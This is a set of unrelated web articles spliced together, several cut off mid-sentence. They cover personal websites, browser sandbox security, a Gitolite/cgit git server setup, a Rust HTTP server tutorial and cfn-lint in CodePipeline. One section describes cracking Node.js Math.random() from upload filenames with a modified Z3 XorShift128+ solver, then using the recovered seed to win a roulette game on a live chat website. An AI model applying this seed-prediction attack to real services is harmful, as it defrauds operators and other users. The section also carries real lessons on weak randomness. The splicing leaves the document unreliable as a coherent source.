      The personal website is a somewhat mysterious animal that 
      lives mostly unobserved in the jungle of the Internet.  A few 
      inexperienced Internet users who live completely within the 
      golden-walled gardens of Facebook and Google may not even be 
      aware of the species' existence.  Other inexperienced users 
      may consider the personal website to be either extinct, like 
      brontosaurus, or a myth, like 
      <a href="https://www.smithsonianmag.com/history/why-bigfoot-and-abominable-snowman-loom-large-human-imagination-180975365/">Bigfoot 
      or the Abominable Snowman</a>.  The truth is that many 
      specimens exist in the wild, but in order to successfully 
      hunt the personal website, a hunter must know the habits of 
      this species well.</p>

   <p>Please allow me to be your guide on this safari through the murky 
      and predator-filled Internet jungle, and I will lead you to 
      some representative specimens of the personal website species and 
      teach you hunting methods that are likely to lead you to others.</p>

   <p>As legend has it, during a more peaceful time, soon after the 
      genesis of the Internet jungle and before the mid 1990's, personal 
      websites were the predominant species.  But queen Sophia the 
      demiurge, wife of King Berners-Lee, at the pleading of her daughter 
      Pandora, acquiesced to provide a breeding ground for Pandora's 
      pets.  Over time, more and more pets were allowed to roam free in 
      the jungle, including not a few predators.  Eventually, these 
      pets became the predominant species of the Internet jungle and 
      personal websites became nearly invisible among all the bellowing 
      and commotion raised by Pandora's pets.  This near invisibility made 
      personal websites very difficult to hunt.</p>

   <p>Before discussing personal websites in detail, I should first 
      mention two common predators in the Internet jungle.  The 
      corporate predator induces the Internet user to willingly approach 
      him by pretending to be a harmless domesticated animal, much like 
      a horse or a cow.  Note that not all corporate websites are 
      predators, though a large number of them do have certain 
      similarities to cows, ponderousness often being one.  But, many 
      corporate websites are not nearly as domesticated as they appear.  
      Just read the details of their terms-of-service agreements if you 
      doubt this.  As with many humans and their cats, the truth is 
      that deciding in any given instance whether a corporate website 
      or its Internet user is the dominant species can be a difficult 
      task.</p>

   <p>A less well understood animal is the hacker.  Hacker is a genus 
      containing a number of species.  Some are predatory, and others 
      are harmless or even beneficial to the ecology of the Internet 
      jungle.  By far, the most populous species of predatory hacker is 
      the "script kiddie".  Script kiddies tend to be blind, feeling 
      their way around the Internet jungle from IP address to IP 
      address.  Their goal seems to be to find those websites that have 
      ingested corporate website code that has made them susceptible to 
      infection.  When a script kiddie finds such a website, it 
      frequently injects malware, which it sometimes uses to help it find 
      and attack other websites.</p>

   <p>The reason for the script kiddie's behavior remains a mystery, 
      since it usually provides little nourishment.  Some script kiddie 
      observers speculate that script kiddies engage in the noted 
      behavior simply to impress others of their species.  While other 
      animals must impress potential mates in order to improve the 
      genetics of their offspring, most potential mates of script kiddies 
      seem unimpressed by their behavior.  A possibility also exists that 
      the script kiddie's behavior serves primarily as a means of 
      determining pecking order, primarily among males of the species.  
      However, one observation that tends to bolster the mating theory is 
      that most script kiddies that have successfully mated no longer 
      engage in their typical behavior.</p>
  
   <p>Even many moderately experienced hunters fear the personal 
      website, because they have been led to believe that personal 
      websites frequently carry diseases--viruses in particular, or 
      parasites generally known as "malware".  Though both of these are 
      possible, they are uncommon.  The truth is that personal websites 
      practice habits that are generally no less cleanly than other 
      Internet jungle species.  However, some of the less wary personal 
      websites do become susceptible to viruses and malware by ingesting 
      code defecated by corporate websites, including code from the unusually 
      flatulent and dyspeptic Microshaft.  Nevertheless, hunters' fear of 
      personal websites is largely overblown. 
      <a href="https://cheapskatesguide.org/articles/no-such-thing-as-secure.html">Well-equipped</a>
      hunters have little to fear.</p>

   <p>Unlike most other animals that must constantly evade predators 
      to survive, the personal website has few known enemies.  The 
      personal website is, however, susceptible to the DMCA parasite, 
      which is capable of suing it to death.  Fortunately, this is a rare 
      occurrence, perhaps mainly due to the near invisibility of the 
      personal website.  For this reason, and because personal websites 
      are almost always so small that they have very little meat on them 
      (otherwise known as posts or articles), they are rarely in 
      danger from predators.  Personal websites also tend to 
      taste bad to the larger corporate predators, as they rarely 
      advertise or produce much of an income.  Very rarely, however, a 
      well-fed personal website may grow to a large enough size 
      to successfully compete with corporate websites for the food provided 
      by users.  When this occurs, some observers fear this fat 
      personal website may be in danger of being killed (see 
      <a href="https://johnfowler.co/facebook-blocked-my-website/">here</a>, 
      <a href="https://heavy.com/news/2018/10/facebook-purge-list-deleted-accounts/">here</a>, 
      <a href="https://www.convinceandconvert.com/social-media-strategy/3-ways-facebook-is-killing-your-website/">here</a>, 
      and <a href="https://www.ndtv.com/world-news/why-does-google-steal-content-from-honest-businesses-us-congressman-2271102">here</a>), 
      but few corporate predators ingest even the fattest personal 
      websites, perhaps because they simply do not know what to do with 
      them.  On rare occasions, however, corporate predators will capture 
      both personal and non-revenue-generating corporate websites and 
      allow them to live for a few more years while dying 
      <a href="https://techcommunity.microsoft.com/t5/healthcare-and-life-sciences/skype-for-business-online-end-of-life-july-31-2021/ba-p/779137">slow 
      deaths from starvation</a>.</p>

   <p>Unlike other animals that are seen or heard mainly at mating time, 
      personal websites do not reveal their presence in this manner, 
      because they do not mate.  Instead, they reproduce asexually.  Some 
      produce offspring by budding, a plantlike characteristic.  Many, if 
      not most, also exhibit another plantlike characteristic.  They 
      sprinkle their spoors (technically, known as hyperlinks) over the 
      floor of the Internet jungle in the hope of being one day chanced 
      upon by an Internet user and ingested.  Though ingestion rarely 
      occurs, when it does, through some process not well understood by 
      present-day science, the Internet user is occasionally induced to 
      create his own personal website.  This website is then free to bud 
      under the careful attention and care of the host Internet user, who 
      has now been transformed into an entity sometimes known as a 
      "developer", though developer is not an especially well-defined 
      designator.  At the proper time, the new website naturally begins 
      to produce its own spoors, and its life cycle repeats.</p>

   <p>Sometimes, spoors and bits of code are exchanged directly with other 
      personal websites, in a manner analogous to bacterial conjugation, 
      in which genetic material, called plasmids, are exchanged between 
      bacteria.  This type of spoor is known as a "backlink".  Sometimes, 
      websites collect backlinks and place them in groups called 
      blogrolls.</p>

   <p>As alluded to previously, the main reason personal websites are so 
      difficult to find in the Internet jungle is that they are almost 
      completely invisible to the bloodhounds of the Internet, known
      as "search engines".  Search engines use search algorithms, 
      rather than smell, to find websites.  Except on rare occasions, the 
      only search in which a personal website appears on <i>any page</i> 
      of a search result is a search that includes the personal website's 
      exact domain name (its location in the Internet jungle) 
      or the exact title of one its articles.  
      Therefore, less than a hundred of the most popular personal websites 
      can be found through the overwhelming majority of Internet 
      searches.  Though this may be hard to believe, it is true.</p>

   <p>Even the smaller search engines like millionshort.com, 
      swisscows.com, and wiby.me are largely blind to any personal 
      websites other than the top 100.  Internet zoologists speculate 
      that smaller search engines are not actually blind to personal 
      websites.  They only pretend to be blind by keeping their eyes 
      tightly closed whenever they encounter a personal website, so as to 
      imitate their leader, the Google search engine, which is truly blind 
      to all but the top 100 or so personal websites.</p>

   <p>Due to the lack of attention that personal websites receive, they 
      often congregate together, or at least maintain an association with 
      others of their kind.  They do this for survival.  You see, personal 
      websites need some amount of attention to survive.  If they cannot 
      get attention from Internet users, they try to get it from each 
      other.  This is the primary behavior by which an experienced hunter 
      may successfully track them.</p>

   <p>When by the greatest stroke of luck, a hunter happens to stumble 
      upon a nearly-invisible personal website, he should immediately look 
      for others …</p></div></div>

<p>As you should know, Node.JS's <code>Math.random()</code> is not cryptographically random and, as such, you can in theory predict future values if you have previous values.</p>
<p>While there have been articles aimed at cracking <code>Math.random()</code> before, they are aimed at browsers, and have not been tried on real-world scenarios. Many websites use Node.JS for their backend, and few suspect <code>Math.random()</code> of, well, not being random.</p>
<h2>The victim</h2>
<p>We are looking at a website proudly developed in TypeScript, which provides a point system with a few gambling games to limit inflation. The one where you can win the most in one move is the roulette, where you pick a number between 1 and 10 and if you win, you get 10x what you put in. The house doesn't actually have an edge here, but since the minimal bet is pretty expensive, most just empty their balance again and again.</p>
<h2>Discovery</h2>
<p>As it turns out, the website is <a href="https://github.com/skychatorg/skychat">open source</a>, so we don't have to imagine what the winning algorithm looks like. There are only a few places where <code>Math.random()</code> is called:</p>
<ul>
<li>When using <code>/roll</code>, the command we're trying to exploit</li>
<li>When using <code>/guess</code>, which is another gambling command</li>
<li>When uploading a file</li>
</ul>
<p>Let's start with <code>/roll</code>.</p>
<h3>/roll</h3>
<div><pre><span></span><code><span>RollPlugin</span><span>.</span><span>TICK_MS</span> <span>=</span> <span>Array</span><span>.</span><span>from</span><span>({</span><span>length</span><span>:</span> <span>3000</span> <span>/</span> <span>150</span><span>})</span>

    <span>.</span><span>concat</span><span>([</span>
        <span>3048</span><span>,</span> <span>3180</span><span>,</span> <span>3307</span><span>,</span> <span>3440</span><span>,</span> <span>3576</span><span>,</span> <span>3723</span><span>,</span> <span>3881</span><span>,</span> <span>4040</span><span>,</span> <span>4209</span><span>,</span>
        <span>4398</span><span>,</span> <span>4603</span><span>,</span> <span>4834</span><span>,</span> <span>5084</span><span>,</span> <span>5372</span><span>,</span> <span>5744</span><span>,</span> <span>6413</span><span>,</span> <span>7621</span>
    <span>]);</span>

<span>// The timeout will increase randomly until reaching maxTimeout</span>

    <span>setTimeout</span><span>(()</span> <span>=&gt;</span> <span>{</span>
        <span>// Move ball to next slot</span>
        <span>this</span><span>.</span><span>currentGame</span><span>!</span><span>.</span><span>ballPosition</span> <span>=</span> <span>(</span><span>++</span><span>this</span><span>.</span><span>currentGame</span><span>!</span><span>.</span><span>ballPosition</span><span>)</span> <span>%</span> <span>10</span><span>;</span>

        <span>// Redraw game</span>
        <span>this</span><span>.</span><span>updateGameMessage</span><span>();</span>
    <span>},</span> <span>tickMs</span><span>);</span>
<span>}</span>

<span>// Wait for latest tick to complete</span>
<span>await</span> <span>waitTimeout</span><span>(</span><span>RollPlugin</span><span>.</span><span>TICK_MS</span><span>[</span><span>RollPlugin</span><span>.</span><span>TICK_MS</span><span>.</span><span>length</span> <span>-</span> <span>1</span><span>]);</span>
</code></pre></div>
<p>This displays a fancy rolling animation, but we're only interested in the result. The only non-deterministic part here is the initial position of the ball: all this code can be reduced to <code>Math.floor(Math.random() * 10) + 37) % 10</code> (37 being the number of slot updates).</p>
<p>This sounds very promising, but in order to get the seed of <code>Math.random()</code>, we'll need a lot more bits than that.</p>
<h3>/guess</h3>
<p>This command generates a number between 0 and 999, and the player that chose the closest number gets the winnings. While this gives you more bits, it requires other people to be willing to play, and is still not enough to crack <code>Math.random()</code>.</p>
<h3>File uploading</h3>
<p>Why would file upload require random numbers, you ask? Maybe the incriminating line will enlighten you:</p>
<div><pre><span></span><code><span>const</span> <span>filePath</span> <span>=</span> <span>'uploads/'</span>
    <span>+</span> <span>date</span><span>.</span><span>toISOString</span><span>().</span><span>substr</span><span>(</span><span>0</span><span>,</span> <span>19</span><span>).</span><span>replace</span><span>(</span><span>/(-|T)/g</span><span>,</span> <span>'/'</span><span>).</span><span>replace</span><span>(</span><span>/:/g</span><span>,</span> <span>'-'</span><span>)</span>
    <span>+</span> <span>'-'</span> <span>+</span> <span>Math</span><span>.</span><span>floor</span><span>(</span><span>1000000000</span> <span>*</span> <span>Math</span><span>.</span><span>random</span><span>())</span> <span>+</span> <span>'.'</span> <span>+</span> <span>extension</span><span>;</span>
</code></pre></div>
<p>This sounds really promising. This gives us 23 (out of 52) bits of data, which should be enough to crack the seed with enough inputs.</p>
<h3>Building the hack</h3>
<p>We're going to base our work off of <a href="https://github.com/TACIXAT/XorShift128Plus">this XorShift128+ cracker</a>, which is unfortunately in Python 2, and only targets browsers.</p>
<p><a href="https://github.com/nodejs/node/blob/v12.x/deps/v8/src/base/utils/random-number-generator.h#L111">Node.JS's random number generator</a> is the same as Chrome's, so after a quick 2to3 conversion, it should be usable as is. And it is! However, we only have a small portion of the available bits, so we'll have to adapt it a bit.</p>
<p>We'll simply replace the <a href="https://github.com/TACIXAT/XorShift128Plus/blob/master/xs128p.py#L43">original simulation</a> of <code>ToDouble()</code>:</p>
<div><pre><span></span><code><span>impl</span> <span>=</span> <span>Implies</span><span>(</span><span>condition</span><span>,</span> <span>LShR</span><span>(</span><span>sym_state0</span><span>,</span> <span>12</span><span>)</span> <span>==</span> <span>generated</span><span>)</span>
</code></pre></div>
<p>With one that has to put in more effort:</p>
<div><pre><span></span><code><span># We don't have the 12 bits of the mantissa, and we don't have the last 29 bits of the fraction component.</span>
<span>MASK</span> <span>=</span> <span>0xFFFFFFFFFFFFFFFF</span>
<span>SKYMASK</span> <span>=</span> <span>MASK</span> <span>&amp;</span> <span>(</span><span>MASK</span> <span>&lt;&lt;</span> <span>29</span><span>)</span> <span>&amp;</span> <span>(</span><span>MASK</span> <span>&gt;&gt;</span> <span>12</span><span>)</span>

<span>impl</span> <span>=</span> <span>Implies</span><span>(</span><span>condition</span><span>,</span> <span>LShR</span><span>(</span><span>sym_state0</span><span>,</span> <span>12</span><span>)</span> <span>&amp;</span> <span>SKYMASK</span> <span>==</span> <span>generated</span><span>)</span>
</code></pre></div>
<p>Then, we can finally test on a local build of the chat system. After uploading 6 files, and using their filenames, we can successfully crack <code>Math.random()</code>. From there, we are able to guess future filenames, and, excitingly, future winning numbers for the roulette game.</p>
<h2>Testing it on the real website</h2>
<p>Things don't always go as smooth as expected. It turns out our method doesn't work at all on the remote website - the generated numbers are completely off, and sometimes the cracker doesn't even find the seed.</p>
<p>It turns out, Node.JS's number generator changed between versions - and the one we worked on locally is not the same as the server. Whoops. At the time, Node.JS v10 was still in LTS phase, so I chose to update my code to support it. It is also the same as v11's, so as long as the owned isn't running some obscure out-of-date version, we should cover all available versions.</p>
<p>Take a look at <a href="https://github.com/nodejs/node/blob/v10.x/deps/v8/src/base/utils/random-number-generator.h#L111">the source code</a>. It seems that v10 uses both state variables, while v12 only uses one. I'm not a cryptographer, but it certainly makes cracking v12 faster with our approach. Let's update our code for v10:</p>
<div><pre><span></span><code><span>impl</span> <span>=</span> <span>Implies</span><span>(</span><span>condition</span><span>,</span> <span>(</span><span>sym_state0</span> <span>+</span> <span>sym_state1</span><span>)</span> <span>&amp;</span> <span>SKYMASK</span> <span>==</span> <span>generated</span><span>)</span>
</code></pre></div>
<p>It took us a few second to crack a seed from v12's PRNG, but this will take a few minutes on v10. But since we only need to crack the seed once to be able to simulate <code>Math.random()</code> many, many times, we don't have to look for optimizations - let's try it for real!</p>
<p><img alt="Victory." src="https://kiwec.net/blog/victory.png"></p>
<p>Wow, how lucky, we won on our first try! Try not to win every time from now on ;)</p>
<h2>Conclusion</h2>
<p>This should be obvious, but don't use <code>Math.random()</code> for anything that you don't want the user to guess. Use Node.JS's <a href="https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback">crypto module</a>, which generates cryptographically secure bytes.</p>
<p>You can read the full source code of the exploit <a href="https://gist.github.com/kiwec/bcd1ea674984bc54584e0b16cb8031e7">in this gist.</a></p>

    Chromium is far more secure than Firefox. Firefox's sandboxing and exploit mitigations are poorer than Chromium's
    by a large degree. </p><p>
    
    Firefox's <a href="https://wiki.mozilla.org/Security/Sandbox">sandboxing</a> lacks any <a href="https://www.chromium.org/Home/chromium-security/site-isolation">site isolation</a>. <a href="https://wiki.mozilla.org/Project_Fission">Project Fission</a> is still a WIP. The sandbox is currently only
    focused on isolating the browser as a whole from the rest of the OS and even that is quite poor. Excluding the issue
    of site isolation, only the Firefox sandbox on Windows is similar to <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md">Chromium's</a> but even then,
    it <a href="https://bugzilla.mozilla.org/buglist.cgi?quicksearch=win32k">lacks</a> <a href="https://googleprojectzero.blogspot.com/2016/11/breaking-chain.html">win32k lockdown</a>. </p><p>
    
    The sandboxing on other platforms is very insecure and the Linux sandbox can hardly be called a sandbox at all as there
    are plenty of trivial escapes such as the <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1129492">X11 server</a>
    (this is also a 5 year old, critical issue). The issues with the Linux sandbox also go far beyond X11. One example is that
    there is <a href="https://wiki.mozilla.org/Security/Sandbox/Process_model#GPU_Process">no GPU process sandboxing</a>. Another example
      is that the seccomp filter is weaker; for example, there is <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1302711">
    barely any ioctl filtering</a> and <a href="https://dxr.mozilla.org/mozilla-central/rev/a5cb1a40413ebfb37e68bc8961e5a46467f06d14/security/sandbox/linux/SandboxFilter.cpp#1125">
    only tty ioctls are blocked</a> and there are a lot more issues. </p><p>
    
    On Android, Firefox <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1565196">does not have a sandbox at all beyond
    the OS app sandbox</a> unlike Chromium which uses the <a href="https://developer.android.com/guide/topics/manifest/service-element#isolated"><code>isolatedProcess</code>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Having some rest these days after some really hardworking months… I decided I
wanted to solve something that was on my to-do list for a long time. Really
long&nbsp;time.</p>
<p>I wanted to have my own git repository for ElenQ and my personal projects
(which are the same thing because I take ElenQ <em>very</em> personally) and so I&nbsp;did.</p>
<p>You may think: so you installed Gitea or something and you are done,&nbsp;right?</p>
<p>But the answer is&nbsp;no.</p>
<p>That would be the normal approach if I didn’t have the arbitrary constraints I
imposed. This text is about those weird constraints and random thoughts I have
about this, and also about what’s my current setup and how to make it. Serving
the second part as a <em>tutorial</em> for myself if I screw up and I need to start
over and also as a way to consciously think about what I&nbsp;did.</p>
<h3>Context: random&nbsp;thoughts</h3>
<p>For me code is not a social network and it shouldn’t be. I understand why
github is the way it is but for me it’s just code. I don’t need to show how
much I code, I don’t need to follow, like, star, fork, or even share my opinion
about other people’s work publicly. That’s completely unrelated to the&nbsp;job.</p>
<p>Large projects like github are changing the way we collaborate. I’m not against
that, but looks like we start to forget that git doesn’t need anything else to
function. There’s no need for pull/merge requests, for web servers or&nbsp;anything.</p>
<p>Web interfaces for code are cool, but nothing is better than your own editor.
I realized I just clone the repositories I want to dig in and search with my
own tools in my local clone so… Why bother to have a powerful<sup id="fnref:powerful"><a href="#fn:powerful">1</a></sup> web&nbsp;interface?</p>
<p>I don’t like to be forced to register in a platform just for sending patches or
taking part in a project. Why do I <strong>need</strong> to have a github&nbsp;account?</p>
<p>ElenQ Technology currently uses a free gitlab account, but recently I’ve
started to be concerned about gitlab’s business practices so I prefer to start
migrating out of it. I’ve seen they always send you to login page when you hit
a 404, and all that kind of weird behaviours that don’t look they have been
done by accident<sup id="fnref:gitlab"><a href="#fn:gitlab">2</a></sup>.  Of course, there’s also the fact that they are a
startup and all that. I don’t really trust them.  But that’s a different story.
I still like the fact that their community edition is free software. It’s a
business model we should do&nbsp;more.</p>
<p>Gitea and Gogs are easy to install, which is a must for me, and they are simple
and useful, but replicate the same model. It’s much better to self-host your
code than relying in a third party, no doubt. But that makes the login problem
even harder: more gitea or gogs instances we create more separate places to
register in<sup id="fnref:forgefed"><a href="#fn:forgefed">3</a></sup>.</p>
<p>Those free software tools solve the problem of the centralization in different
scales, but they are small social networks,&nbsp;still.</p>
<h3>Possible&nbsp;replacements</h3>
<p>I’m ok with sending an email and I’m ok with receiving emails from&nbsp;people.</p>
<p>With git’s email workflow (<code>git sendmail</code>, or <code>git format-patch</code> if you don’t
want to configure your connection to your email account) you can send patches
via email that can be applied in the code directly. That’s more than enough for
many&nbsp;projects.</p>
<p>Issues, suggestions and questions can be sent via email with no hassle,&nbsp;too.</p>
<p>The possibility to clone the repositories via git protocol gives people the
chance to check the code freely in their editor of choice, without being
tracked while they browse<sup id="fnref:editor"><a href="#fn:editor">4</a></sup>.</p>
<h3>Problems</h3>
<p>Issue management makes perfect sense to me and it’s a process that is cool to
have in the open. It helps people take part in projects, check what’s the
status of the project, collaborate more effectively, share the bugs they find
and so on.  But, for the kind of projects I have, issue management is more of a
problem than a solution. I’ve been receiving spam in my gitlab issues for a
while. To be honest, there have been more spam than real issues in my gitlab&nbsp;account.</p>
<p>There’s not any easy way to fully replace an issue management tool, though.
Maybe a good use of the <code>README.md</code> and some extra files in the repository can
help. People are still able to reach and share their bug reports via email
without being publicly&nbsp;exposed.</p>
<p>That’s also a thing: if you let people interact freely on an issue board you
need some moderation (which requires skills and effort). It is true that people
may come to very interesting ideas if working together, but it’s also true that
only happens in very popular projects<sup id="fnref:popularity"><a href="#fn:popularity">5</a></sup>. Handling that privately
helps to avoid misunderstandings you can’t&nbsp;control.</p>
<p>Apart from that, we have to admit only sharing repositories via git protocol
has exactly <code>0</code> discoverability, so we have to share them in a website or
something. Maybe not for interacting with them, but at least to show&nbsp;them.</p>
<p>Git is able to handle a website via gitweb too, but it’s simple, a little bit
hard to configure and not too fast. Also, it can be more visually appealing by&nbsp;default.</p>
<p>On the owner’s side, it’s interesting to be able to decide which repositories
you want to share with the public. Being able to give permissions to specific
people without giving them permissions to the whole server is also nice. If
the permissions can be set in specific branches of the repositories&nbsp;better.</p>
<h3>Other&nbsp;option</h3>
<p><a href="https://fossil-scm.org/home/doc/trunk/www/index.wiki">Fossil-scm</a> is really
interesting. It comes with support for issues and wikis, and devnotes are a
great idea I’m sure I could take advantage&nbsp;of.</p>
<p>But the tool itself is not as good as git in my&nbsp;opinion.</p>
<p>Fossil uses SQLite databases for its things (it’s developed by SQLite’s
developers) which is cool sometimes but in other times is not as good as it
sounds. I’m getting too used to plain text files&nbsp;maybe?</p>
<p>I tried to configure a multi-repository fossil for the server and I gave up in
the past but it’s probably my fault rather than&nbsp;theirs.</p>
<p>If you are interested on trying something new, you should take a look to
fossil. If you do, please, <a href="https://ekaitz.elenq.tech/pages/about.html">contact
me</a> and tell me your experience
with&nbsp;it.</p>
<h3>My&nbsp;solution</h3>
<p>For the permissions I used Gitolite, which is an authorization control that
makes heavy use of ssh. It uses a management repository where the administrator
can add users’ public keys and each project’s permissions and&nbsp;metadata.</p>
<p>It basically creates ssh pseudo-sessions that are locked in gitolite-shell,
which decides if the user has access to the repo or not. Interesting use of ssh
for this. <a href="https://gitolite.com/gitolite/overview.html">Read more in the website</a>, they explain it much better
than I&nbsp;can.</p>
<p>For the website I chose <code>cgit</code>, which is famous for being fast (cached by
default) and reliable, and turned out to be easy to&nbsp;configure.</p>
<p>Both projects are in the order of some thousands lines of code, which is an
amount I could manage to read and edit if I want&nbsp;to.</p>
<h3>How to&nbsp;configure</h3>
<p>Well, this is the reminder for myself, but it can be useful for you&nbsp;too.</p>
<p>I installed both of the projects using debian’s package&nbsp;repository.</p>
<h4>Gitolite</h4>
<p>By default, debian package creates a <code>gitolite3</code> user so you have to take that
in account if you want to make gitolite work in a debian machine (other
machines will have other details to&nbsp;check).</p>
<p>Gitolite’s debian package also asks for administrator’s public ssh-key so you
have to provide it sooner or later. Once that’s done you’ll get a fantastic
<code>/var/lib/gitolite3</code> folder with everything you need. You’ll see that folder
contains a <code>projects.list</code> file, that lists the git repositories, a
<code>repositories</code> folder with the repositories, a <code>.gitolite</code> folder and a
<code>.gitolite.rc</code> file. The last one needs some changes in order to work correctly
with&nbsp;cgit:</p>
<h4>Enable cgit access to the&nbsp;repos</h4>
<p>Set <code>.gitolite.rc</code><span>‘</span>s <code>UMASK</code> to <code>0027</code> to give group access to new repositories,
that will let other users in the group (cgit and git-daemon) access the&nbsp;repositories.</p>
<p>You probably don’t want to share the gitolite-admin repository so leave it with
the permissions it came with. If you screw up here or there don’t be afraid to
<code>chmod</code> any repository&nbsp;later.</p>
<p>You also need to make <code>GIT_CONFIG_KEYS</code> more permissive (<code>.*</code> if you are crazy
enough) if you want Gitolite to be able to load git configuration. That way
you’ll be able to set gitweb description in the repository that cgit can&nbsp;read.</p>
<h4>Enable git unauthenticated&nbsp;clone</h4>
<p>There are a couple of ways to do this. The first is to set the <span>HTTP</span> mode, that
is something I didn’t do but you can check how to do it in the&nbsp;docs.</p>
<p>I used git-daemon for git based unauthenticated clones. It’s simple but you
may need to create your own systemd service or&nbsp;something:</p>
<pre><code>#  git.service file

[Unit]
Description=Start Git Daemon

[Service]
ExecStart=/usr/bin/git daemon  --base-path=/var/lib/gitolite3/repositories --reuseaddr /var/lib/gitolite3/repositories

Restart=always
RestartSec=500ms

StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=git-daemon

User=gitdaemon
Group=gitolite3

[Install]
WantedBy=multi-user.target</code></pre>


<p>Once you do that you should add it to systemd with <code>systemctl enable
/path/to/git.service</code> or something like that. Once added you can start&nbsp;it.</p>
<p>But that’s not going to show any repository because you didn’t export any. If
you want to export them, Gitolite has an specific configuration option you have
to set in the <code>gitolite-admin</code> repo. You have to give the user <code>daemon</code> read&nbsp;access:</p>
<pre><code>repo testing
    # daemon is what adds the daemon-export
    R       =   daemon
    # You should add some extra people too...

    # This is for cgit:
    config gitweb.description = For testing purpose.
    config gitweb.owner = Ekaitz</code></pre>


<p>When you add the <code>daemon</code> access Gitolite adds a <code>git-daemon-export-ok</code> file to
the repository that says to git-daemon the project can be shared. It won’t be
possible to push to it anyway because we didn’t allow it in the git-daemon&nbsp;configuration.</p>
<h4>cgit</h4>
<p>Some cgit configuration does the rest. This is my example configuration on
cgit. I’ll probably change it soon, but there it&nbsp;goes:</p>
<pre><code># cgit config
# see cgitrc(5) for details

css=/cgit.css
logo=/cgit.png
footer=/usr/share/cgit/footer.html

repository-sort=age

# if cgit messes up links, use a virtual-root.
# For example, cgit.example.org/ has this value:
virtual-root=/

clone-url=git://$HTTP_HOST/$CGIT_REPO_URL
# …</code></pre></div></div>

For our purposes, that’s fine, as this is <strong>not</strong> a writeup on how to do a <em>proper</em> HTTP server implementation of the newest version (The <a href="https://en.wikipedia.org/wiki/HTTP/3" rel="noopener noreferrer" target="_blank">HTTP/3</a>
spec was recently introduced, on 26 September 2019). This post serves as a <em>gentle</em> introduction to how HTTP servers work and the basic principles behind it.
This guide is not meant for writing a server for use in production, if you wish to do so, use a reliable server like <a href="https://www.nginx.com/" rel="noopener noreferrer" target="_blank">Nginx</a>
, or <a href="https://httpd.apache.org/" rel="noopener noreferrer" target="_blank">Apache</a>
.</p><p>If you are interested in the differences between versions and the history of <em>HTTP</em>, <a href="https://hpbn.co/brief-history-of-http/" rel="noopener noreferrer" target="_blank">this is a great article</a>
.</p><h2 id="what-is-http">What is HTTP <a arial-abel="header-anchor" href="#what-is-http">#</a></h2><p>HTTP stands for Hyper Text Transfer Protocol. It’s the vehicle that delivers <em>essentially</em> all resources (files and other data) on the <em>World Wide Web</em>. Most of the time, HTTP takes place through <strong>TCP/IP</strong> sockets, this is the other protocol that we will be using (though not implementing).</p><blockquote><p>This does not preclude HTTP from being implemented on top of
any other protocol on the Internet, or on other networks. HTTP only
presumes a reliable transport; any protocol that provides such
guarantees can be used, and the mapping of the HTTP/1.1 request and
response structures onto the transport data units of the protocol in
question is outside the scope of this specification.</p></blockquote><figure><img data-src="https://d33wubrfki0l68.cloudfront.net/7c46c8212b57cf30c01995ae98a619b03054d0fc/75332/posts/linda/kid.png" alt="Kid surfing on a keyboard from the 90s." width="400px" src="https://d33wubrfki0l68.cloudfront.net/7c46c8212b57cf30c01995ae98a619b03054d0fc/75332/posts/linda/kid.png"></figure><p>The communication that happens between clients and servers happens using the HTTP protocol (there is also the <a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29" rel="noopener noreferrer" target="_blank">Gopher protocol</a>
if you’re a hipster, or <a href="https://mqtt.org/" rel="noopener noreferrer" target="_blank">MQTT</a>
if you’re in the IOT space). Where a client might be a web browser or software that understands HTTP. Both the TCP and HTTP protocols are <em>request-response</em> protocols. This means that the client will initiate a request to the server, which will <em>listen</em> for requests, and make an appropriate response, containing some <em>resource</em>.</p><p>HTTP transmits <em>resources</em>, which are simply chunks of data that are identified by a Uniform Resource Locator (URL). A resource might be a file or some generated query result.</p><p>You might ask:</p><blockquote><p>What and how do these servers send these responses back?</p></blockquote><p>Well, that’s what the RFC is for, it defines the formats that they take. <a href="https://tools.ietf.org/html/rfc793" rel="noopener noreferrer" target="_blank">TCP</a>
is a level lower than HTTP and describes <strong>how</strong> information gets sent from one location to another, but never specifies what the information is. This is where HTTP comes in.</p><p>The code can be found on <a href="https://github.com/NullSense/Linda/tree/5a86c25f7c8dec9ad975c9569ce166e22f7a07ee" rel="noopener noreferrer" target="_blank">Github (link of repo at the time of writing)</a></p><p>Our first order of business is to listen for and handle incoming TCP connections on some specific port. I will avoid using any libraries that make this process trivial (e.g. an http crate), as the point of this is to focus on how a server works.</p><figure><img data-src="https://d33wubrfki0l68.cloudfront.net/29148a90c87e229c03a11f8fc23089f95c67d8eb/b69db/posts/linda/docking.jpg" alt="Progress spacecraft in process of docking to the International Space Station." src="https://d33wubrfki0l68.cloudfront.net/29148a90c87e229c03a11f8fc23089f95c67d8eb/b69db/posts/linda/docking.jpg"><figcaption><p>Progress spacecraft in process of docking to the International Space Station</p></figcaption></figure><p>So, let’s start a new project, let’s call her Linda:</p><p>Subsequently, we will accept and handle that connection.

If we were doing multiple writes, we would buffer them up and flush the stream when all of them are done. This is useful if we’d be chunking data, in that case we’d use a <code>BufWriter</code>, this is useful when sending large files and in that case is a lot more efficient.

Engineers who work with CloudFormation normally run this tool locally on their machine to fix any issues with the templates and correct them immediately. </p>
<p>However... there are use cases where you work in bigger teams and need to manage hundreds of templates. <strong>Integrating cfn-lint in a CI/CD pipeline helps to enforce rules over shared CloudFormation templates, which in turn makes standardizing rules and guidelines over bigger teams easier.</strong> We are going to be integrating cfn-lint in AWS CodePipeline using a custom AWS CodeBuild project.</p>
<h2 id="overview">Overview</h2>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598517427621/k8BD7UJbG.jpeg?auto=format&amp;q=60" alt="cfn-lint-codepipeline.jpg"></p>
<p>In this example, we have an AWS CodePipeline that contains the source code including the CloudFormation templates in an AWS CodeCommit repository. Next up we have the Validation stage where we have an AWS CodeBuild action that contains the cfn-lint tool. The templates will be scanned and the report will be sent to an encrypted S3 bucket. The last stage contains the actual deployment after the validation has finished.</p>

